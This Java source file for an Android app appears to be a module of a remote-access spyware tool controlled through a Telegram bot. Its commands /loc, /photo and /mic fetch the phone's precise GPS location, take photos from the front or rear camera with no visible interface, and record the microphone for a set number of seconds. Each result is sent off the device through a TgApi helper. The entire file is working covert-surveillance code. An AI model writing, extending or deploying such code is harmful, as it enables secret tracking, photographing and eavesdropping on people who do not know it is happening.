package com.sec.app;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.os.Looper;
import java.io.File;
import java.io.FileOutputStream;
import java.util.concurrent.atomic.AtomicBoolean;

public class ModMedia {
    private static Context ctx;

    public static void init(Context c) { ctx = c; }

    // ─────────────────── /loc ───────────────────
    public static void loc() {
        if (!perm(Manifest.permission.ACCESS_FINE_LOCATION)) {
            TgApi.send("sem permissão LOCATION"); return;
        }
        new Thread(() -> {
            try {
                LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
                Location l = null;
                Location g = null, n = null;
                try { g = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER); } catch (Exception ignored) {}
                try { n = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER); } catch (Exception ignored) {}
                if (g != null && n != null) l = g.getTime() > n.getTime() ? g : n;
                else if (g != null) l = g;
                else if (n != null) l = n;

                if (l == null || System.currentTimeMillis() - l.getTime() > 5 * 60 * 1000) {
                    final Object lock = new Object();
                    final Location[] best = {l};
                    LocationListener listener = loc -> {
                        synchronized (lock) {
                            if (best[0] == null || loc.getAccuracy() < best[0].getAccuracy())
                                best[0] = loc;
                        }
                    };
                    try { if (lm.isProviderEnabled(LocationManager.GPS_PROVIDER))
                        lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper());
                    } catch (Exception ignored) {}
                    try { if (lm.isProviderEnabled(LocationManager.NETWORK_PROVIDER))
                        lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper());
                    } catch (Exception ignored) {}
                    try { Thread.sleep(30000); } catch (Exception ignored) {}
                    try { lm.removeUpdates(listener); } catch (Exception ignored) {}
                    // leitura sincronizada — evita data race com o listener
                    synchronized (lock) { l = best[0]; }
                }

                if (l == null) { TgApi.send("📍 sem fix de localização (GPS off ou sem sinal)"); return; }

                String map = "https://maps.google.com/?q=" + l.getLatitude() + "," + l.getLongitude();
                TgApi.send("📍 Lat: " + l.getLatitude() +
                    "\nLng: " + l.getLongitude() +
                    "\nPrecisão: " + l.getAccuracy() + "m" +
                    "\nFonte: " + l.getProvider() +
                    "\n" + map);
            } catch (Exception e) { TgApi.send("loc erro: " + e); }
        }).start();
    }

    // ─────────────────── /photo ───────────────────
    // Usa Camera1 API (mais simples e compatível, deprecated mas funcional).
    // Captura em JPEG no maior preview size, sem UI.
    public static void photo(boolean front) {
        if (!perm(Manifest.permission.CAMERA)) { TgApi.send("sem permissão CAMERA"); return; }
        new Thread(() -> {
            int camId = front ? findFrontCamera() : 0;
            if (camId < 0) { TgApi.send("câmera " + (front ? "frontal" : "traseira") + " não encontrada"); return; }

            android.hardware.Camera cam = null;
            final AtomicBoolean released = new AtomicBoolean(false);
            try {
                cam = android.hardware.Camera.open(camId);
                android.hardware.Camera.Parameters p = cam.getParameters();

                // escolhe a maior picture size suportada para captura estática
                android.hardware.Camera.Size best = null;
                for (android.hardware.Camera.Size s : p.getSupportedPictureSizes()) {
                    if (best == null || (s.width * s.height) > (best.width * best.height))
                        best = s;
                }
                if (best != null) p.setPictureSize(best.width, best.height);
                p.setRotation(90);
                cam.setParameters(p);
                cam.startPreview();

                // pequeno delay para auto-exposição estabilizar
                Thread.sleep(800);

                final android.hardware.Camera c = cam;
                final Object lock = new Object();
                final boolean[] done = {false};
                cam.takePicture(null, null, (data, camera) -> {
                    try {
                        File dir = new File("/sdcard/Download");
                        if (!dir.exists()) dir.mkdirs();
                        File out = new File(dir, "pic_" + System.currentTimeMillis() + ".jpg");
                        FileOutputStream fo = new FileOutputStream(out);
                        fo.write(data);
                        fo.close();
                        TgApi.sendPhoto(out, "📷 " + (front ? "frontal" : "traseira") +
                            " | " + out.getName());
                    } catch (Exception e) {
                        TgApi.send("photo save erro: " + e);
                    } finally {
                        try { c.stopPreview(); } catch (Exception ignored) {}
                        // garante UM único release mesmo com race
                        if (released.compareAndSet(false, true))
                            try { c.release(); } catch (Exception ignored) {}
                        synchronized (lock) {
                            done[0] = true;
                            lock.notifyAll();
                        }
                    }
                });

                // aguarda callback (timeout 10s) — checa a flag ANTES de dormir
                // para não perder o notify se o callback já tiver disparado.
                synchronized (lock) {
                    long deadline = System.currentTimeMillis() + 10000;
                    while (!done[0]) {
                        long remaining = deadline - System.currentTimeMillis();
                        if (remaining <= 0) break;
                        try { lock.wait(remaining); } catch (InterruptedException ignored) {}
                    }
                }
            } catch (Exception e) {
                TgApi.send("photo erro: " + e);
            } finally {
                // libera a câmera em timeout / exceções — single-release protegido
                if (cam != null && released.compareAndSet(false, true))
                    try { cam.release(); } catch (Exception ignored) {}
            }
        }).start();
    }

    private static int findFrontCamera() {
        android.hardware.Camera.CameraInfo ci = new android.hardware.Camera.CameraInfo();
        for (int i = 0; i < android.hardware.Camera.getNumberOfCameras(); i++) {
            android.hardware.Camera.getCameraInfo(i, ci);
            if (ci.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_FRONT) return i;
        }
        return -1;
    }

    // ─────────────────── /mic ───────────────────
    public static void mic(int seconds) {
        if (!perm(Manifest.permission.RECORD_AUDIO)) { TgApi.send("sem permissão RECORD_AUDIO"); return; }
        new Thread(() -> {
            MediaRecorder mr = null;
            File out = null;
            try {
                out = new File("/sdcard/Download/mic_" + System.currentTimeMillis() + ".m4a");
                mr = new MediaRecorder();
                mr.setAudioSource(MediaRecorder.AudioSource.MIC);
                mr.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                mr.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                mr.setAudioEncodingBitRate(96000);
                mr.setAudioSamplingRate(44100);
                mr.setOutputFile(out.getAbsolutePath());
                mr.prepare();
                mr.start();

                TgApi.send("🎙 gravando " + seconds + "s...");
                Thread.sleep(seconds * 1000L);

                mr.stop();
                mr.release();
                mr = null;
                TgApi.sendFile(out, "🎙 " + seconds + "s | " + out.getName());
            } catch (Exception e) {
                TgApi.send("mic erro: " + e);
                if (mr != null) try { mr.stop(); mr.release(); } catch (Exception ignored) {}
                if (out != null && out.exists()) out.delete();
            }
        }).start();
    }

    // ─────────────────── helpers ───────────────────
    private static boolean perm(String p) {
        return ctx.checkSelfPermission(p) == PackageManager.PERMISSION_GRANTED;
    }
}
